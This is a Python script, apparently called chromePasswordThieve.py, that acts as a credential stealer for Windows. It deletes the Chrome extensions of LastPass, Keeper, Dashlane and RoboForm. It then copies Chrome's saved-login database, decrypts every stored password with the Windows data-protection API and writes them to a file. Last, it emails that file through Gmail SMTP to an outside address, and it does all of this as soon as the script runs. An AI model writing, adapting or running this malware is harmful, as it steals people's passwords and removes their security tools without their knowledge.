import os
import os.path as op
import shutil
import smtplib
import win32crypt
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
from shutil import copyfile
from sqlite3 import connect

FROM = "from@gmail.com"
PASSWORD = "password"

TO = "to@gmail.com"
SUBJECT = "data for chromePasswordThieve.py"

MESSAGE = """\

here is output.txt :) 

"""

env = os.getenv("LOCALAPPDATA")
path_lastpass = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\hdokiejnpimakedhajhdlcegeplioahd"
path_keeper = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\bfogiafebfohielmmehodmfbbebbbpei"
path_dasklane = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\fdjamakpfbbddfjaooikfcpapjohcfmg"
path_roboform = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\pnlccmojcmeohlpggmfnbbiapkmbliob"

try:
    pass
    shutil.rmtree(path_lastpass)
    shutil.rmtree(path_keeper)
    shutil.rmtree(path_dasklane)
    shutil.rmtree(path_roboform)
except:
    pass


# path_all = env+ "\\Google\\Chrome\\User Data\\Default\\Extensions

def getPass():
    # https://github.com/darkarp/chrome-password-hacking/blob/master/create_server.py
    destination = "output.txt"

    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
    path = path.strip()
    path2 = path2.strip()

    try:
        copyfile(path, path2)
    except:
        pass
    conn = connect(path2)
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    if os.path.exists(destination):
        os.remove(destination)
    sites = []
    for raw in cursor.fetchall():
        # print(raw)
        ## raw[0] = url
        ## raw[1] = login
        ## raw[2] = binary
        try:
            if raw[0] not in sites:
                # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                else:
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                sites.append(raw[0])
        except:
            continue
    conn.close()
    return 0


def sendEmail():
    # https://stackoverflow.com/questions/3362600/how-to-send-email-attachments
    msg = MIMEMultipart()
    msg['From'] = FROM
    msg['To'] = TO
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = SUBJECT
    msg.attach(MIMEText(MESSAGE))

    part = MIMEBase('application', "octet-stream")
    with open('output.txt', 'rb') as file:
        part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="{}"'.format(op.basename('output.txt')))  # name(s) of attachment(s)
    msg.attach(part)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login(FROM, PASSWORD)
    smtp.sendmail(FROM, TO, msg.as_string())
    smtp.quit()

    print('successfully sent the mail')


getPass()

sendEmail()
